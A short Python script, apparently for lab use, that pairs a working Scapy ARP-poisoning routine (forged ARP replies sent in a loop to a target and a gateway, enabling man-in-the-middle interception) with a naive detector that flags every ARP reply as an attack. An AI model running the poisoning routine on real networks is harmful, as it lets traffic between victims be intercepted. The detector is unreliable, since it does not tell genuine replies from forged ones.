from scapy.all import *
from scapy.layers.l2 import ARP
import time

def arp_poison(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    while True:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
        time.sleep(2)

def arp_monitor(packet):
    if packet.haslayer(ARP):
        if packet[ARP].op == 2:
            print(f"ARP Poisoning attempt detected: {packet[ARP].psrc} -> {packet[ARP].pdst}")

def get_mac(ip_address):
    responses, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), timeout=2, retry=10)
    for _, response in responses:
        return response[Ether].src

if __name__ == "__main__":
    target_ip = "192.168.1.10"
    gateway_ip = "192.168.1.1"
    # Uncomment the following line for ARP poisoning
    # arp_poison(target_ip, gateway_ip)
    # Uncomment the following line for ARP poisoning detection
    # sniff(prn=arp_monitor, filter="arp", store=0)
